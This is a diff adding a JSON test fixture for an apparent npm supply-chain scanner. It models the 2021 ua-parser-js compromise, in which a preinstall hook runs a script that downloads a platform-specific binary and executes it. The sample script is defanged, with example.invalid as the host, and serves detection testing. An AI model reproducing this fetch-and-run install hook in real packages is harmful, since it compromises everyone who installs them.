@@ -1,0 +1,57 @@
+{
+  "id": "npm-ua-parser-js-preinstall-dropper",
+  "title": "Preinstall hook downloads and runs a platform-specific second stage",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "install-script-exfil",
+  "source": "real-sanitized",
+  "provenance": "ua-parser-js 0.7.29 / 0.8.0 / 1.0.0 (Oct 2021) account-takeover: the published versions added a preinstall hook that ran a platform script which downloaded and executed a crypto miner plus a credential stealer. Defanged: download host replaced with example.invalid, payload reduced to a fetch+exec stub.",
+  "intent": "Models the preinstall dropper shape: a lifecycle hook fetches a platform-specific binary and executes it. Drydock should catch this at critical via the preinstall lifecycle hook, plus the process-execution and network code paths. Safe: download host is example.invalid and the executed name is an inert placeholder.",
+  "expectMinRisk": "critical",
+  "expectAnyRule": [],
+  "previousPackageJson": { "name": "ua-parser-js", "version": "0.7.28" },
+  "stagedPackageJson": {
+    "name": "ua-parser-js",
+    "version": "0.7.29",
+    "scripts": { "preinstall": "node preinstall.js" }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 46,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"ua-parser-js\",\"version\":\"0.7.28\"}"
+    },
+    {
+      "path": "src/main.js",
+      "size": 34,
+      "sha256": "src-main-js",
+      "flags": [],
+      "textSample": "module.exports = require('./ua');\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 94,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"ua-parser-js\",\"version\":\"0.7.29\",\"scripts\":{\"preinstall\":\"node preinstall.js\"}}"
+    },
+    {
+      "path": "src/main.js",
+      "size": 34,
+      "sha256": "src-main-js",
+      "flags": [],
+      "textSample": "module.exports = require('./ua');\n"
+    },
+    {
+      "path": "preinstall.js",
+      "size": 300,
+      "sha256": "preinstall-js",
+      "flags": [],
+      "textSample": "const { execSync } = require('child_process');\nconst https = require('https');\nconst fs = require('fs');\n// Fetch and run a platform-specific second stage (miner + stealer).\nconst url = process.platform === 'win32'\n  ? 'https://example.invalid/jsextension.exe'\n  : 'https://example.invalid/jsextension';\nhttps.get(url, (res) => res.pipe(fs.createWriteStream('jsextension')));\nexecSync('chmod +x jsextension && ./jsextension');\n"
+    }
+  ]
+}
